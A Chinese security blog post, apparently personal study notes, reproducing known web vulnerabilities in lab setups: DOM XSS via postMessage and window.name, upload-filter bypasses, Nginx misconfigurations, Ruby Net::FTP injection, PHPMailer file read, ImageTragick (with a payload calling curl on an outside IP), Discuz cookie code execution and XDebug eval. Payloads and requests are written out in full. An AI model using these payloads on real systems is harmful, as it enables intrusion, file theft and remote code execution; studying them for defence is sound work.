@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.7.1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.3.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.3.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.3.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    save_scroll: false,
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="DOMXSS学习1、postMessagepostMessage 支持跨域使用，使用场景比较广泛，如支付成功、登录、退出、唤起APP等等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="src漏洞挖掘和绕过姿势">
+<meta property="og:url" content="http://GD.com/2019/08/03/biji/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DOMXSS学习1、postMessagepostMessage 支持跨域使用，使用场景比较广泛，如支付成功、登录、退出、唤起APP等等。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565675145212.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565675207423.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1564994657945.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1564995092446.png">
+<meta property="og:image" content="https://github.com/vulhub/vulhub/raw/master/phpmailer/CVE-2017-5223/2.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565143730770.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565143782172.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565501574288.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565501620485.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565531477916.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565501653128.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565579529964.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565579539040.png">
+<meta property="og:image" content="http://gd.com/2019/08/03/biji/1565619202894.png">
+<meta property="og:updated_time" content="2019-08-15T03:52:35.607Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="src漏洞挖掘和绕过姿势">
+<meta name="twitter:description" content="DOMXSS学习1、postMessagepostMessage 支持跨域使用，使用场景比较广泛，如支付成功、登录、退出、唤起APP等等。">
+<meta name="twitter:image" content="http://gd.com/2019/08/03/biji/1565675145212.png">
+  <link rel="canonical" href="http://GD.com/2019/08/03/biji/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>src漏洞挖掘和绕过姿势 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content page-post-detail">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://GD.com/2019/08/03/biji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="GD">
+      <meta itemprop="description" content="a GOOD pwner">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">src漏洞挖掘和绕过姿势
+
+            
+          </h1>
+        
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-03 11:14:11" itemprop="dateCreated datePublished" datetime="2019-08-03T11:14:11+08:00">2019-08-03</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-08-15 11:52:35" itemprop="dateModified" datetime="2019-08-15T11:52:35+08:00">2019-08-15</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="DOMXSS学习"><a href="#DOMXSS学习" class="headerlink" title="DOMXSS学习"></a>DOMXSS学习</h1><h2 id="1、postMessage"><a href="#1、postMessage" class="headerlink" title="1、postMessage"></a>1、postMessage</h2><p>postMessage 支持跨域使用，使用场景比较广泛，如支付成功、登录、退出、唤起<br>APP等等。</p>
+<a id="more"></a>
+<p>漏洞代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">	document.write(e.data.command);</span><br><span class="line">	eval(e.data);</span><br><span class="line">	</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">        &lt;div id=&quot;color&quot;&gt;Frame Color&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;iframe id=&quot;child&quot; src=&quot;http://139.196.143.238:81&quot; &gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    	window.onload=function()&#123;</span><br><span class="line">            window[0].postMessage(&apos;alert(1)&apos;,&apos;*&apos;); </span><br><span class="line">        &#125;      	</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/03/biji/1565675145212.png" alt="1565675145212"></p>
+<h2 id="2、window-name"><a href="#2、window-name" class="headerlink" title="2、window.name"></a>2、window.name</h2><p>window.name 与其他 window 对象不同，它在窗口刷新后会保留。</p>
+<p>漏洞代码：</p>
+<p><code>eval(window.name);</code></p>
+<p>poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">        &lt;div id=&quot;color&quot;&gt;Frame Color&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;iframe id=&quot;child&quot; src=&quot;http://139.196.143.238:81&quot; &gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    	window.onload=function()&#123;</span><br><span class="line">            window.name=&quot;\x61lert(2)&quot;;   								</span><br><span class="line">            window.location=&quot;http://139.196.143.238:81&quot;; </span><br><span class="line">        &#125;   	</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/03/biji/1565675207423.png" alt="1565675207423"></p>
+<h1 id="上传php绕过："><a href="#上传php绕过：" class="headerlink" title="上传php绕过："></a>上传php绕过：</h1><p>1.php.xxx   </p>
+<p>利用 CVE-2017-15715，上传一个包含换行符的文件。注意，只能是<code>\x0A</code>，不能是<code>\x0D\x0A</code>，所以我们用 hex 功能在 1.php 后面添加一个\x0A</p>
+<p>参考  <a href="https://blog.kieng.cn/2019/01/31/468/" target="_blank" rel="noopener">https://blog.kieng.cn/2019/01/31/468/</a></p>
+<p>我们无法上传PHP后缀的文件，需要利用CVE-2013-4547我们上传一个。<code>1.gif</code> ，注意后面的空格，<code></code><a href="http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php`，即可发现PHP已被解析：" target="_blank" rel="noopener">http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php`，即可发现PHP已被解析：</a></p>
+<p>参考 <a href="https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547</a></p>
+<p>上传  shell.shtml 内容 <!--#exec cmd="ls" --> 可以实现rce</p>
+<p>参考  <a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a></p>
+<h5 id="Nginx的解析漏洞复现"><a href="#Nginx的解析漏洞复现" class="headerlink" title="Nginx的解析漏洞复现"></a>Nginx的解析漏洞复现</h5><p>上传一个普通文件如1.png   然后访问/1.png/.php   会解析php文件</p>
+<p>参考 <a href="https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability</a></p>
+<ul>
+<li>新建一个名为“test.asp”的目录，该目录下的任何文件都作为asp程序执行（特殊符号是”/“)</li>
+<li>上传名为“test.asp;.jpg”的文件，虽然该文件真正的后缀名是”.jpg”,但由于含有特殊符号“;”，仍然会被IIS作为asp程序执行。</li>
+</ul>
+<p>总结参考 <a href="http://dvsx.cn/2019/07/20/wen-jian-shang-chuan-rao-guo-zi-shi-zong-jie/" target="_blank" rel="noopener">http://dvsx.cn/2019/07/20/wen-jian-shang-chuan-rao-guo-zi-shi-zong-jie/</a></p>
+<h1 id="Flask（Jinja2）服务端模板注入漏洞"><a href="#Flask（Jinja2）服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2）服务端模板注入漏洞"></a>Flask（Jinja2）服务端模板注入漏洞</h1><p><a href="http://your-ip/?name=" target="_blank" rel="noopener">http://your-ip/?name=</a>54289</p>
+<p>参数name注入代码通过服务器实行代码注入</p>
+<p>参考 <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p>
+<h1 id="Ruby-Net-FTP模块命令注入漏洞（CVE-2017-17405）"><a href="#Ruby-Net-FTP模块命令注入漏洞（CVE-2017-17405）" class="headerlink" title="Ruby Net :: FTP模块命令注入漏洞（CVE-2017-17405）"></a>Ruby Net :: FTP模块命令注入漏洞（CVE-2017-17405）</h1><p>Ruby Net :: FTP模块是一个FTP客户端，在上传和下载文件的过程中，打开本地文件时使用了<code>open</code>函数。而在ruby中，<code>open</code>函数是借用系统命令来打开文件，且没用过滤shell字符，导致在用户控制文件名的情况下，将可以注入任意命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口</span><br><span class="line"></span><br><span class="line">python3 -m pyftpdlib -p 2121 -i 0.0.0.0</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/03/biji/1564994657945.png" alt="1564994657945"></p>
+<p>注入命令<code>|touch${IFS}success.txt</code>（空格用代替<code>${IFS}</code>，原因不表）</p>
+<p>发送请求  <a href="http://139.196.143.238:7050//download?uri=ftp://139.196.143.238:2121/&amp;file=|touch${IFS}success.txt" target="_blank" rel="noopener">http://139.196.143.238:7050//download?uri=ftp://139.196.143.238:2121/&amp;file=|touch${IFS}success.txt</a></p>
+<p><img src="/2019/08/03/biji/1564995092446.png" alt="1564995092446"></p>
+<h1 id="PHPMailer任意文件读取漏洞（CVE-2017-5223）"><a href="#PHPMailer任意文件读取漏洞（CVE-2017-5223）" class="headerlink" title="PHPMailer任意文件读取漏洞（CVE-2017-5223）"></a>PHPMailer任意文件读取漏洞（CVE-2017-5223）</h1><p>PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（<code>&lt;img src=&quot;...&quot;&gt;</code>），并将其src属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用<code>&lt;img src=&quot;/etc/passwd&quot;&gt;</code>将文件<code>/etc/passwd</code>作为附件读取出来，造成任意文件读取漏洞。</p>
+<p><img src="https://github.com/vulhub/vulhub/raw/master/phpmailer/CVE-2017-5223/2.png" alt="img"></p>
+<h1 id="Nginx-配置错误导致漏洞"><a href="#Nginx-配置错误导致漏洞" class="headerlink" title="Nginx 配置错误导致漏洞"></a>Nginx 配置错误导致漏洞</h1><h2 id="1-CRLF注入漏洞"><a href="#1-CRLF注入漏洞" class="headerlink" title="1. CRLF注入漏洞"></a>1. CRLF注入漏洞</h2><p>Nginx会将<code>$uri</code>进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。</p>
+<p>Payload: <code>http://your-ip:8080/%0a%0dSet-Cookie:%20a=1</code>，可注入Set-Cookie头。</p>
+<h2 id="2-目录穿越漏洞"><a href="#2-目录穿越漏洞" class="headerlink" title="2. 目录穿越漏洞"></a>2. 目录穿越漏洞</h2><p>Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
+<p><img src="/2019/08/03/biji/1565143730770.png" alt="1565143730770"></p>
+<p>Payload: <code>http://139.196.143.238:8081/files../</code> ，成功穿越到根目录：</p>
+<p><img src="/2019/08/03/biji/1565143782172.png" alt="1565143782172"></p>
+<h1 id="Imagetragick-命令执行漏洞（CVE-2016–3714）"><a href="#Imagetragick-命令执行漏洞（CVE-2016–3714）" class="headerlink" title="Imagetragick 命令执行漏洞（CVE-2016–3714）"></a>Imagetragick 命令执行漏洞（CVE-2016–3714）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。</span><br></pre></td></tr></table></figure>
+<p>ImageMagick 之所以支持那么多的文件格式, 是因为它内置了非常多的图像处理库, 对于这些图像处理库, ImageMagick 给它起了个名字叫做”Delegate”(委托), 每个 Delegate 对应一种格式的文件, 然后通过系统的 system() 命令来调用外部的 lib 进行处理。调用外部 lib 的过程是使用系统的 system 命令来执行的，导致命令执行的代码</p>
+<p>发送请求   <a href="http://139.196.143.238/demo.php" target="_blank" rel="noopener">http://139.196.143.238/demo.php</a></p>
+<p>或者  convert vul.jpg 2.jpg</p>
+<p><img src="/2019/08/03/biji/1565501574288.png" alt="1565501574288"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/oops.jpg&quot;|curl &quot;http://139.196.143.238:8878)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<p>发送如下数据包：</p>
+<p><img src="/2019/08/03/biji/1565501620485.png" alt="1565501620485"></p>
+<p>或者直接上传poc图片</p>
+<p><img src="/2019/08/03/biji/1565531477916.png" alt="1565531477916"></p>
+<p>服务器上监听：</p>
+<p><img src="/2019/08/03/biji/1565501653128.png" alt="1565501653128"></p>
+<h1 id="Discuz-7-x-6-x全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x / 6.x全局变量防御绕过导致代码执行"></a>Discuz 7.x / 6.x全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p>
+<p>直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></p>
+<p><img src="/2019/08/03/biji/1565579529964.png" alt="1565579529964"></p>
+<p><img src="/2019/08/03/biji/1565579539040.png" alt="1565579539040"></p>
+<h1 id="XDebug远程调试漏洞（代码执行）"><a href="#XDebug远程调试漏洞（代码执行）" class="headerlink" title="XDebug远程调试漏洞（代码执行）"></a>XDebug远程调试漏洞（代码执行）</h1><p>XDebug的是PHP的一个扩展，用于调试PHP代码如果目标开启了远程调试模式，并设置。<code>remote_connect_back = 1</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = 1</span><br><span class="line">xdebug.remote_enable = 1</span><br></pre></td></tr></table></figure>
+<p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug的将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址），并通过dbgp协议与其通信，我们通过dbgp中提供的的eval方法即可在目标服务器上执行任意PHP代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http://127.0.0.1:8080/index.php -c &apos;shell_exec(&apos;id&apos;);&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/03/biji/1565619202894.png" alt="1565619202894"></p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/07/15/spring/" rel="next" title="spring框架cve复现">
+                  <i class="fa fa-chevron-left"></i> spring框架cve复现
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/08/15/tools/" rel="prev" title="cve框架漏洞复现和实现自动化扫描器">
+                  cve框架漏洞复现和实现自动化扫描器 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">GD</p>
+  <div class="site-description motion-element" itemprop="description">a GOOD pwner</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DOMXSS学习"><span class="nav-number">1.</span> <span class="nav-text">DOMXSS学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、postMessage"><span class="nav-number">1.1.</span> <span class="nav-text">1、postMessage</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、window-name"><span class="nav-number">1.2.</span> <span class="nav-text">2、window.name</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#上传php绕过："><span class="nav-number">2.</span> <span class="nav-text">上传php绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Nginx的解析漏洞复现"><span class="nav-number">2.0.0.0.1.</span> <span class="nav-text">Nginx的解析漏洞复现</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flask（Jinja2）服务端模板注入漏洞"><span class="nav-number">3.</span> <span class="nav-text">Flask（Jinja2）服务端模板注入漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ruby-Net-FTP模块命令注入漏洞（CVE-2017-17405）"><span class="nav-number">4.</span> <span class="nav-text">Ruby Net :: FTP模块命令注入漏洞（CVE-2017-17405）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHPMailer任意文件读取漏洞（CVE-2017-5223）"><span class="nav-number">5.</span> <span class="nav-text">PHPMailer任意文件读取漏洞（CVE-2017-5223）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nginx-配置错误导致漏洞"><span class="nav-number">6.</span> <span class="nav-text">Nginx 配置错误导致漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-CRLF注入漏洞"><span class="nav-number">6.1.</span> <span class="nav-text">1. CRLF注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-目录穿越漏洞"><span class="nav-number">6.2.</span> <span class="nav-text">2. 目录穿越漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Imagetragick-命令执行漏洞（CVE-2016–3714）"><span class="nav-number">7.</span> <span class="nav-text">Imagetragick 命令执行漏洞（CVE-2016–3714）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Discuz-7-x-6-x全局变量防御绕过导致代码执行"><span class="nav-number">8.</span> <span class="nav-text">Discuz 7.x / 6.x全局变量防御绕过导致代码执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XDebug远程调试漏洞（代码执行）"><span class="nav-number">9.</span> <span class="nav-text">XDebug远程调试漏洞（代码执行）</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">GD</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.7.1</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.3.0</div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+      </div>
+
+    
+
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+<script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+
+  <script src="/js/schemes/muse.js?v=7.3.0"></script>
+
+
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+</body>
+</html>
